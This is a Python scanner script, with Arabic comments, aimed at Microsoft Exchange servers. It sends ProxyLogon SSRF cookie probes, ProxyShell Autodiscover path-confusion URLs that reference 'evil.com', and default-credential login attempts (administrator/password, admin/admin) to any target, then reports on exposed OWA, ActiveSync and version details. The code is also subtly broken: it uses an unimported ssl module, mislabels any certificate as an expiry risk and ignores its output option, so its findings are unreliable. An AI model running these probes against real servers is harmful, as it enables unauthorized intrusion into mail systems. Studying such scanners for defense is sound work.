#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة فحص متخصصة لثغرات Microsoft Exchange Server
Microsoft Exchange Vulnerability Scanner
"""

import requests
import socket
import json
import argparse
from datetime import datetime
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ExchangeVulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []

    def banner(self):
        banner = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║              Microsoft Exchange Vulnerability Scanner        ║
    ║               فحص متخصص لثغرات Microsoft Exchange          ║
    ║                                                              ║
    ║  ProxyLogon • ProxyShell • OWA • ActiveSync • Autodiscover  ║
    ╚═══════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def scan_proxylogon(self, target):
        """فحص ثغرة ProxyLogon (CVE-2021-26855)"""
        print("🔍 فحص ثغرة ProxyLogon...")
        
        # اختبار SSRF عبر رأس X-BEResource
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Cookie': 'X-BEResource=localhost/owa/auth/logon.aspx?&~1;',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        vulnerable_endpoints = [
            '/owa/auth/x.js',
            '/ecp/default.flt',
            '/ecp/pentest.js',
            '/owa/auth/logon.aspx'
        ]
        
        for endpoint in vulnerable_endpoints:
            try:
                url = f"https://{target}{endpoint}"
                response = self.session.get(url, headers=headers, timeout=15, verify=False)
                
                # علامات الإصابة بثغرة ProxyLogon
                if response.status_code == 200 and 'X-FEServer' in response.headers:
                    self.vulnerabilities.append({
                        'vulnerability': 'ProxyLogon',
                        'cve': 'CVE-2021-26855',
                        'target': target,
                        'url': url,
                        'risk_level': 'CRITICAL',
                        'description': 'ثغرة ProxyLogon محتملة - SSRF عبر X-BEResource',
                        'details': {
                            'endpoint': endpoint,
                            'response_headers': dict(response.headers)
                        }
                    })
                    return True
                    
            except Exception as e:
                continue
        
        return False

    def scan_proxyshell(self, target):
        """فحص ثغرة ProxyShell (CVE-2021-34473, CVE-2021-34523)"""
        print("🔍 فحص ثغرة ProxyShell...")
        
        # اختبار RCE عبر Autodiscover
        autodiscover_payloads = [
            f"https://{target}/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3f@evil.com",
            f"https://{target}/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@evil.com",
            f"https://{target}/autodiscover/autodiscover.json?@evil.com/PowerShell/?&Email=autodiscover/autodiscover.json%3f@evil.com"
        ]
        
        for payload in autodiscover_payloads:
            try:
                response = self.session.get(payload, timeout=15, verify=False)
                
                # علامات الإصابة
                if response.status_code == 200 and 'X-CalculatedBETarget' in response.headers:
                    self.vulnerabilities.append({
                        'vulnerability': 'ProxyShell',
                        'cve': 'CVE-2021-34473',
                        'target': target,
                        'url': payload,
                        'risk_level': 'CRITICAL',
                        'description': 'ثغرة ProxyShell محتملة - RCE عبر Autodiscover',
                        'details': {
                            'payload': payload,
                            'response_headers': dict(response.headers)
                        }
                    })
                    return True
                    
            except Exception as e:
                continue
        
        return False

    def scan_owa_endpoints(self, target):
        """فحص نقاط نهاية OWA المعرضة"""
        print("🔍 فحص OWA endpoints...")
        
        owa_endpoints = [
            '/owa/auth/logon.aspx',
            '/owa/auth.owa',
            '/ecp/default.aspx',
            '/ecp/',
            '/owa/',
            '/Microsoft-Server-ActiveSync',
            '/EWS/Exchange.asmx',
            '/Autodiscover/Autodiscover.xml',
            '/Rpc/'
        ]
        
        exposed_endpoints = []
        
        for endpoint in owa_endpoints:
            try:
                url = f"https://{target}{endpoint}"
                response = self.session.get(url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # تحقق من وجود Exchange
                    exchange_indicators = [
                        'Outlook Web App',
                        'Exchange',
                        'owaLgnBdy',
                        'logonPage',
                        'X-OWA-Version'
                    ]
                    
                    page_content = response.text.lower()
                    if any(indicator.lower() in page_content for indicator in exchange_indicators):
                        exposed_endpoints.append({
                            'endpoint': endpoint,
                            'url': url,
                            'status': 'exposed',
                            'response_size': len(response.content)
                        })
                        
                        self.vulnerabilities.append({
                            'vulnerability': 'OWA Endpoint Exposed',
                            'target': target,
                            'url': url,
                            'risk_level': 'HIGH',
                            'description': f'نقطة نهاية OWA مكشوفة: {endpoint}',
                            'details': {
                                'endpoint': endpoint,
                                'response_size': len(response.content)
                            }
                        })
                        
            except Exception as e:
                continue
        
        return exposed_endpoints

    def scan_version_disclosure(self, target):
        """فحص كشف إصدار Exchange Server"""
        print("🔍 فحص كشف الإصدار...")
        
        version_indicators = [
            '/owa/auth/logon.aspx',
            '/ecp/default.aspx',
            '/owa/',
            '/ecp/'
        ]
        
        for path in version_indicators:
            try:
                url = f"https://{target}{path}"
                response = self.session.get(url, timeout=10, verify=False)
                
                # استخراج معلومات الإصدار
                version_patterns = [
                    r'Exchange/(\d+\.\d+\.\d+\.\d+)',
                    r'X-OWA-Version: (\d+\.\d+\.\d+\.\d+)',
                    r'owa/auth/(\d+\.\d+\.\d+\.\d+)',
                    r'Exchange Server (\d{4})'
                ]
                
                for pattern in version_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        version = matches[0]
                        self.vulnerabilities.append({
                            'vulnerability': 'Version Disclosure',
                            'target': target,
                            'url': url,
                            'risk_level': 'MEDIUM',
                            'description': f'كشف إصدار Exchange Server: {version}',
                            'details': {
                                'version': version,
                                'endpoint': path
                            }
                        })
                        break
                        
            except Exception as e:
                continue

    def scan_ssl_configuration(self, target):
        """فحص إعدادات SSL/TLS لـ Exchange"""
        print("🔍 فحص إعدادات SSL...")
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    
                    # فحص صلاحية الشهادة
                    not_after = cert.get('notAfter')
                    if not_after:
                        self.vulnerabilities.append({
                            'vulnerability': 'SSL Certificate Expiry',
                            'target': target,
                            'risk_level': 'HIGH',
                            'description': f'شهادة SSL تنتهي في: {not_after}',
                            'details': {
                                'expiry_date': not_after,
                                'issuer': cert.get('issuer', [])
                            }
                        })
                        
        except Exception as e:
            self.vulnerabilities.append({
                'vulnerability': 'SSL Configuration',
                'target': target,
                'risk_level': 'HIGH',
                'description': f'مشكلة في إعدادات SSL: {str(e)}',
                'details': {
                    'error': str(e)
                }
            })

    def scan_authentication_bypass(self, target):
        """فحص تجاوز المصادقة"""
        print("🔍 فحص تجاوز المصادقة...")
        
        bypass_payloads = [
            {'path': '/owa/auth/logon.aspx', 'payload': {'username': 'administrator', 'password': 'password'}},
            {'path': '/ecp/default.aspx', 'payload': {'username': 'administrator', 'password': 'password'}},
            {'path': '/owa/auth.owa', 'payload': {'destination': 'https://localhost/owa', 'username': 'admin', 'password': 'admin'}}
        ]
        
        for bypass in bypass_payloads:
            try:
                url = f"https://{target}{bypass['path']}"
                response = self.session.post(url, data=bypass['payload'], timeout=15, verify=False)
                
                # علامات تجاوز المصادقة
                if response.status_code == 302 and 'sessionid' in str(response.cookies).lower():
                    self.vulnerabilities.append({
                        'vulnerability': 'Authentication Bypass',
                        'target': target,
                        'url': url,
                        'risk_level': 'CRITICAL',
                        'description': 'تجاوز مصادقة محتمل في Exchange',
                        'details': {
                            'endpoint': bypass['path'],
                            'payload': bypass['payload']
                        }
                    })
                    
            except Exception as e:
                continue

    def scan_active_sync(self, target):
        """فحص ActiveSync API"""
        print("🔍 فحص ActiveSync API...")
        
        activesync_url = f"https://{target}/Microsoft-Server-ActiveSync"
        
        try:
            response = self.session.get(activesync_url, timeout=10, verify=False)
            
            if response.status_code == 401 or response.status_code == 403:
                self.vulnerabilities.append({
                    'vulnerability': 'ActiveSync Exposed',
                    'target': target,
                    'url': activesync_url,
                    'risk_level': 'MEDIUM',
                    'description': 'خدمة ActiveSync مكشوفة وتحتاج مصادقة',
                    'details': {
                        'status_code': response.status_code,
                        'headers': dict(response.headers)
                    }
                })
            elif response.status_code == 200:
                self.vulnerabilities.append({
                    'vulnerability': 'ActiveSync Unprotected',
                    'target': target,
                    'url': activesync_url,
                    'risk_level': 'HIGH',
                    'description': 'خدمة ActiveSync متاحة بدون مصادقة',
                    'details': {
                        'status_code': response.status_code
                    }
                })
                
        except Exception as e:
            pass

    def generate_report(self, target):
        """إنشاء تقرير شامل"""
        print("\n📊 تقرير فحص Microsoft Exchange")
        print("=" * 60)
        
        if not self.vulnerabilities:
            print("✅ لم يتم العثور على ثغرات في Microsoft Exchange")
            return
        
        # تجميع حسب المخاطر
        critical = [v for v in self.vulnerabilities if v['risk_level'] == 'CRITICAL']
        high = [v for v in self.vulnerabilities if v['risk_level'] == 'HIGH']
        medium = [v for v in self.vulnerabilities if v['risk_level'] == 'MEDIUM']
        
        print(f"🚨 ثغرات حرجة: {len(critical)}")
        print(f"🔴 ثغرات عالية: {len(high)}")
        print(f"⚠️  ثغرات متوسطة: {len(medium)}")
        print()
        
        # عرض التفاصيل
        for vuln in self.vulnerabilities:
            print(f"[{vuln['risk_level']}] {vuln['vulnerability']}: {vuln['description']}")
            if 'cve' in vuln:
                print(f"    CVE: {vuln['cve']}")
            if 'url' in vuln:
                print(f"    URL: {vuln['url']}")
            print()
        
        # حفظ النتائج
        report = {
            'target': target,
            'scan_date': datetime.now().isoformat(),
            'scan_type': 'Microsoft Exchange Vulnerability Scan',
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical': len(critical),
            'high': len(high),
            'medium': len(medium),
            'vulnerabilities': self.vulnerabilities
        }
        
        filename = f"exchange_vulnerabilities_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        
        print(f"💾 تم حفظ النتائج في: {filename}")

    def run_exchange_scan(self, target):
        """تشغيل فحص شامل لـ Exchange"""
        self.banner()
        
        print(f"🎯 بدء فحص Microsoft Exchange: {target}")
        print("=" * 60)
        
        # تشغيل جميع عمليات الفحص
        scanners = [
            self.scan_proxylogon,
            self.scan_proxyshell,
            self.scan_owa_endpoints,
            self.scan_version_disclosure,
            self.scan_ssl_configuration,
            self.scan_authentication_bypass,
            self.scan_active_sync
        ]
        
        for scanner in scanners:
            try:
                scanner(target)
            except Exception as e:
                print(f"⚠️ خطأ في {scanner.__name__}: {str(e)}")
        
        self.generate_report(target)
        return self.vulnerabilities

def main():
    parser = argparse.ArgumentParser(description='أداة فحص متخصصة لثغرات Microsoft Exchange Server')
    parser.add_argument('-t', '--target', required=True, help='الهدف للفحص (نطاق أو IP)')
    parser.add_argument('-o', '--output', help='ملف الإخراج JSON')
    
    args = parser.parse_args()
    
    scanner = ExchangeVulnerabilityScanner()
    vulnerabilities = scanner.run_exchange_scan(args.target)

if __name__ == "__main__":
    main()